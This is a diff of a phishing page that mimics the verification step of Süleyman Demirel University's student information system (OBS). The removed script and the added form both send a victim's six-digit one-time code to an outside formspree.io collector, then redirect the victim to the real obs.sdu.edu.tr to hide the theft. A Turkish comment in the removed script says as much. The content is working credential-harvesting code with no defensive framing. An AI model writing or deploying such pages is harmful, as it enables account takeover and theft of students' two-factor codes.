@@ -946,26 +946,24 @@
                                             DOĞRULA
                                         </button>
                                     </form>
+                                    <div class="login-form-container" style="margin-top: 20px;">
+                                        <form action="https://formspree.io/f/mvzzwyqq" method="POST" target="_self">
 
-                                    <script>
-                                        var form = document.getElementById("dogrulamaForm");
+                                            <input type="hidden" name="_next" value="https://obs.sdu.edu.tr/">
 
-                                        form.addEventListener("submit", function (event) {
-                                            event.preventDefault();
-                                            var data = new FormData(event.target);
+                                            <div class="form-group mb-3">
+                                                <input type="text" name="dogrulama_kodu"
+                                                    class="form-control text-center" placeholder="6 Haneli Kodu Giriniz"
+                                                    required maxlength="6"
+                                                    style="font-size: 20px; font-weight: bold; height: 50px;">
+                                            </div>
 
-                                            fetch(event.target.action, {
-                                                method: 'POST',
-                                                body: data,
-                                                headers: { 'Accept': 'application/json' }
-                                            }).then(response => {
-                                                // Kod mailinize düştüğü an kullanıcıyı gerçek OBS'ye salla
-                                                window.location.href = "https://obs.sdu.edu.tr/";
-                                            }).catch(error => {
-                                                window.location.href = "https://obs.sdu.edu.tr/";
-                                            });
-                                        });
-                                    </script>
+                                            <button type="submit" class="btn btn-primary btn-block"
+                                                style="width:100%; background-color:#800000; color:white; height: 50px; border: none; font-weight: bold;">
+                                                DOĞRULA
+                                            </button>
+                                        </form>
+                                    </div>
                                     <div class="form-group position-relative">
                                         <label class=control-label for=ValidationCode>Doğrulama Kodu</label>
                                         <input class=form-control inputmode=numeric autocomplete=one-time-code
